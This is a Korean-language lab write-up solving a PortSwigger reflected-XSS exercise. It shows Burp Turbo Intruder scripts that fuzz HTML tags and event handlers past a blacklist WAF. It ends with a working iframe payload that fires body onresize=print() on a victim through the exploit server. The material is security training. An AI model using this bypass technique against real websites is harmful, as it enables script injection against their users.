# 🚩Lab: Reflected XSS into HTML context with most tags and attributes blocked


This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.


### 🔍 분석 및 공격 과정
1. `흔한 XSS 벡터`에 대한 방어를 수행하는 `WAF`는 구현되어 있는 랩이다. 취약점이 존재하는 엔트리포인트는 `search` 기능이다.
2. 그렇다면 어떤 XSS 벡터에 대해 방어가 구현되어 있지 않은지 한번 `퍼징`로 확인해본다.
3. 이때 문제를 풀기 위해 포트스위거에 첨부된 `XSS 치트시트`를 이용하였다.
4. 치트시트를 버프스위트의 `터보 인트루더`에 붙여넣어 공격을 수행했다.

```html
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=2,
                            requestsPerConnection=50,
                            pipeline=False)
    a = """abbr
acronym
address
animate
animatemotion
animatetransform
applet
area
article
aside
audio
b
base
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
image
img
input
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
set
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
wbr
xmp
xss
""".splitlines()

    for tag in a:
        engine.queue(target.req, tag)

def handleResponse(req, interesting):
    table.add(req)
```
5. 수행 결과 `<body>` 태그는 `200코드`로 통과됨.
6. 이제 어떤 `이벤트 핸들러`를 사용할 수 있는지 다시 퍼징.
```html
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=2,
                            requestsPerConnection=50,
                            pipeline=False)
    a = """onafterprint
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforematch
onbeforepaste
onbeforeprint
onbeforetoggle
onbeforeunload
onbegin
onblur
oncancel
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncommand
oncontentvisibilityautostatechange
oncontentvisibilityautostatechange(hidden)
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfocus
onfocus(autofocus)
onfocusin
onfocusout
onformdata
onfullscreenchange
ongesturechange
ongestureend
ongesturestart
ongotpointercapture
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadstart
onlocation
onlostpointercapture
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpagereveal
onpageshow
onpageswap
onpaste
onpause
onplay
onplaying
onpointercancel
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onpromptaction
onpromptdismiss
onratechange
onrepeat
onreset
onresize
onscroll
onscrollend
onscrollsnapchange
onscrollsnapchanging
onsearch
onsecuritypolicyviolation
onseeked
onseeking
onselect
onselectionchange
onselectstart
onslotchange
onsubmit
onsuspend
ontimeupdate
ontoggle
ontoggle(popover)
ontouchcancel
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvalidationstatuschange
onvolumechange
onwaiting
onwaiting(loop)
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkitfullscreenchange
onwebkitmouseforcechanged
onwebkitmouseforcedown
onwebkitmouseforceup
onwebkitmouseforcewillbegin
onwebkitneedkey
onwebkitplaybacktargetavailabilitychanged
onwebkitpresentationmodechanged
onwebkittransitionend
onwebkitwillrevealbottom
onwheel
""".splitlines()

    for tag in a:
        engine.queue(target.req, tag)

def handleResponse(req, interesting):
    table.add(req)
```
8. `onresize` 이벤트 사용가능. -> `iframe` 태그의 `src`를 `<iframe src="https://0a8300fc0403a77681082092002b0037.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
-이때 src앞에 붙은 `">`는 사용자의 입력값이 <h1>같은 태그 안에 들어가는 단순한 `html context`라면 없어도 무방하지만, tag의 attribute에 들어간다면 `">`로 제대로 닫아 주고 다음 태그를 호출해야한다. 그런 의미에서 붙은 관습적인 페이로드.
  해당 스크립트는 브라우저 창의 사이즈가 변경되면 작동하는데, `onload` 이벤트를 넣어 페이지가 로드되자 마자 창의 사이즈는 변경되고 즉시 print()가 실행됨.
9. 피해자가 해당 `html문서`를 렌더링 하도록 유도해야함. 이 시나리오는 해당 랩의 왼쪽 상단에 있는 `Go to exploit server` 페이지에서 재현 가능.
10. `html문서`를 패킷의 `body필드`에 실어 피해자가에 전송하면 solve. 



### 💡 취약점 원리
 `WAF`에서 `태그`들과 `이벤트`를 필터링을 하긴 하나 `블랙리스트`방식으로 구현하여서 생소한 태그들은 미쳐 막지 못한 것 같다. 
